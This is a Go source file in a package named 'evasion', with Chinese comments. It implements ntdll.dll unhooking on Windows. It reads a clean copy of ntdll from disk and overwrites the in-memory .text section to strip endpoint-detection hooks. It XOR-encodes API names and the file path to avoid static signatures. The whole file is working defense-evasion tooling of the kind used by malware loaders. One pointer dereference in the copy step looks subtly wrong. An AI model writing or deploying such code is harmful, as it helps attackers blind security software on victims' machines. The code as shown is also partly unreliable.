//go:build windows

package evasion

import (
	"debug/pe"
	"syscall"
	"unsafe"
)

// NtdllUnhook 从磁盘重新加载干净的ntdll.dll，覆盖内存中被EDR Hook的.text段
// 使用XOR加密的API名，消除静态字符串
func NtdllUnhook() error {
	hNtdll := syscall.NewLazyDLL(xorDec(encNtDll, xk)).Handle()
	if hNtdll == 0 {
		return nil
	}

	cleanData, err := readFileRaw()
	if err != nil {
		return err
	}

	loadedAddr, loadedSize := findTextInMemory(syscall.Handle(hNtdll))
	cleanAddr, cleanSize := findTextInBytes(cleanData)

	if loadedAddr == 0 || cleanAddr == nil || loadedSize != cleanSize {
		return nil
	}

	var old uint32
	regSz := uintptr(loadedSize)
	CallNtPVM(^uintptr(0), &loadedAddr, &regSz, 0x40, &old)

	CallRtlCopy(loadedAddr, *(*uintptr)(cleanAddr), uintptr(loadedSize))

	CallNtPVM(^uintptr(0), &loadedAddr, &regSz, uintptr(old), &old)

	return nil
}

func readFileRaw() ([]byte, error) {
	// C:\Windows\System32\ntdll.dll XOR加密
	encPath := []byte{0x74, 0x0d, 0x6b, 0x60, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x64, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04, 0x05, 0x6b, 0x59, 0x43, 0x53, 0x5b, 0x5b, 0x19, 0x53, 0x5b, 0x5b}
	pathPtr, _ := syscall.UTF16PtrFromString(xorDec(encPath, xk))

	hFile, _, _ := k32Proc(encCFW).Call(uintptr(unsafe.Pointer(pathPtr)), 0x80000000, 1, 0, 3, 0x80, 0)
	if hFile == ^uintptr(0) || hFile == 0 {
		return nil, syscall.ERROR_FILE_NOT_FOUND
	}
	defer k32Proc(encCH).Call(hFile)

	var high uint32
	sz, _, _ := k32Proc(encGFS).Call(hFile, uintptr(unsafe.Pointer(&high)))

	data := make([]byte, sz)
	var n uint32
	k32Proc(encRF).Call(hFile, uintptr(unsafe.Pointer(&data[0])), uintptr(sz), uintptr(unsafe.Pointer(&n)), 0)
	return data[:n], nil
}

func findTextInMemory(hMod syscall.Handle) (uintptr, uint32) {
	base := uintptr(hMod)
	dos := (*dosHeader)(unsafe.Pointer(base))
	if dos.magic != 0x5A4D {
		return 0, 0
	}
	nt := (*ntHeader64)(unsafe.Pointer(base + uintptr(dos.lfanew)))
	if nt.sig != 0x4550 {
		return 0, 0
	}
	secOff := base + uintptr(dos.lfanew) + 24 + uintptr(nt.fileHdr.sizeOfOptHdr)
	for i := uint16(0); i < nt.fileHdr.numSec; i++ {
		sec := (*sectionHdr)(unsafe.Pointer(secOff + uintptr(i)*40))
		if sec.nameStr() == ".text" {
			return base + uintptr(sec.virtAddr), sec.virtSize
		}
	}
	return 0, 0
}

func findTextInBytes(data []byte) (unsafe.Pointer, uint32) {
	pef, err := pe.NewFile(&byteReader{data})
	if err != nil {
		return nil, 0
	}
	defer pef.Close()
	for _, s := range pef.Sections {
		if s.Name == ".text" {
			buf := make([]byte, s.Size)
			s.ReadAt(buf, 0)
			return unsafe.Pointer(&buf[0]), s.Size
		}
	}
	return nil, 0
}

type byteReader struct{ data []byte }

func (r *byteReader) ReadAt(p []byte, off int64) (int, error) {
	if off >= int64(len(r.data)) {
		return 0, syscall.ERROR_HANDLE_EOF
	}
	return copy(p, r.data[off:]), nil
}

type dosHeader struct {
	magic  uint16
	_      [58]byte
	lfanew uint32
}

type fileHdr struct {
	_            [2]byte
	numSec       uint16
	_            [12]byte
	sizeOfOptHdr uint16
	_            [2]byte
}

type ntHeader64 struct {
	sig     uint32
	fileHdr fileHdr
	_       [112]byte
}

type sectionHdr struct {
	name     [8]byte
	virtSize uint32
	virtAddr uint32
	_        [24]byte
}

func (s *sectionHdr) nameStr() string {
	for i, c := range s.name {
		if c == 0 {
			return string(s.name[:i])
		}
	}
	return string(s.name[:])
}
